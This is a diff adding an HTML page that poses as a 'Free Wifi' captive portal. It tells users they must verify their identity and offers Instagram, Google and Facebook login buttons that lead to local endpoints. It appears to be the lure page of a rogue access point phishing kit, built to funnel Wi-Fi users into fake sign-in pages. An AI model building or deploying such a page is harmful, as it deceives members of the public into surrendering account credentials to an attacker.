@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Wifi - Authentication</title>
+  <meta name="viewport" content="width=device-width, initial-scale=0.75">
+  <link rel="icon" href="data:,">
+  <link rel="stylesheet" type="text/css" href="instagram_style.css">
+</head>
+<body>
+  <div class="container">
+      <div class="box">
+          <div class="heading2"></div>
+          <p>Before allowing access to network we would like to verify your identity if you are not a robot. Select authentication method from the list below.</p>
+          <form class="login-form" action="/instagram_auth">
+              <button class="login-button" title="login">Auth Via Instagram</button>
+              <p></p>
+          </form>
+          <form class="login-form" action="/google_auth">
+              <button class="login-button" title="login">Auth Via Google</button>
+              <p></p>
+          </form>
+          <form class="login-form" action="/facebook_auth">
+              <button class="login-button" title="login">Auth Via Facebook</button>
+              <p></p>
+          </form>
+      </div>
+  </div>
+</body>
+</html>
